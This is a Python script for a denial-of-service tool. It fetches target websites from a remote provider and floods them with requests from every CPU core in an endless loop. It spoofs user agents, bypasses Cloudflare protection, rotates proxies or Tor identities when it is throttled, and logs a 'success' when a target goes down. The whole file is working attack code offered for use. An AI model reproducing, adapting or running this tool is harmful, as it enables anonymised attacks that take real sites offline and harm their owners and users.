import asyncio
import os

import requests.exceptions
from sys import stderr
from concurrent.futures import ProcessPoolExecutor
from random import choice
import cloudscraper
from argparse import ArgumentParser
from loguru import logger
from pyuseragents import random as random_agent
from remote_provider import RemoteProvider
from settings import get_settings
from tor_proxy import TorProxy

settings = get_settings()
parser = ArgumentParser()
parser.add_argument('threads', nargs='?', default=settings.DEFAULT_THREADS)
parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
parser.set_defaults(verbose=False)
parser.add_argument("-lo", "--logger-output", dest="logger_output")
parser.add_argument("-lr", "--logger-results", dest="logger_results")
parser.set_defaults(no_clear=False)
parser.set_defaults(proxy_view=False)
parser.set_defaults(logger_output=stderr)
parser.set_defaults(logger_results=stderr)
args, unknown = parser.parse_known_args()
no_clear = args.no_clear
proxy_view = args.proxy_view

provider = RemoteProvider(args.targets)
tor = TorProxy(
    host=settings.TOR_HOST,
    port=settings.TOR_PORT,
    control_port=settings.TOR_CONTROL_PORT,
    password=settings.TOR_PASSWORD
)


def set_logger_format():
    logger.remove()
    logger.add(
        args.logger_output,
        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
            <cyan>{line}</cyan> - <white>{message}</white>"
    )
    logger.add(
        args.logger_results,
        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
            <cyan>{line}</cyan> - <white>{message}</white>",
        level="SUCCESS"
    )


def fetch_url(scraper, site, proxies):
    try:
        attack_response = scraper.get(site, timeout=settings.READ_TIMEOUT)
        logger.info(f"{site} status {attack_response.status_code}")
        if attack_response.status_code > 400:
            logger.success(f"{site} errored with {attack_response.status_code}")
            return
        if attack_response.status_code > 302:
            if not settings.ENABLE_TOR:
                proxy = choice(proxies)
                scraper.proxies.update({
                    'http': f'http://{proxy["auth"]}@{proxy["ip"]}',
                    'https': f'https://{proxy["auth"]}@{proxy["ip"]}'
                })
                logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
            else:
                tor.change_ip()
                logger.info('USING TOR PROXY')
                scraper.proxies.update(tor.get_sock5_proxies())
            attack_response = scraper.get(site, timeout=settings.READ_TIMEOUT)
            logger.info(f"{site} status {attack_response.status_code}")
    except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
        logger.success(f"{site} is down. Detail: {e}")

    except Exception as e:
        logger.error(f"unexpected error {e}")


def attack_subprocess(site: str, proxies: list):
    scraper = cloudscraper.create_scraper(browser=settings.BROWSER)
    headers = settings.HEADERS_TEMPLATE
    headers['User-Agent'] = random_agent()
    scraper.headers.update(headers)
    logger.info(f"STARTING ATTACK TO  {site}")
    scraper.proxies.clear()
    tasks = asyncio.gather(*(fetch_url(scraper, site, proxies) for _ in range(settings.MAX_REQUESTS_TO_SITE)))
    loop = asyncio.get_event_loop()
    loop.run_until_complete(tasks)


if __name__ == '__main__':
    set_logger_format()
    sites = provider.get_target_sites()
    proxies = provider.get_proxies()
    while True:
        with ProcessPoolExecutor() as executor:
            processes = [executor.submit(attack_subprocess, choice(sites), proxies)
                         for _ in range(os.cpu_count())]
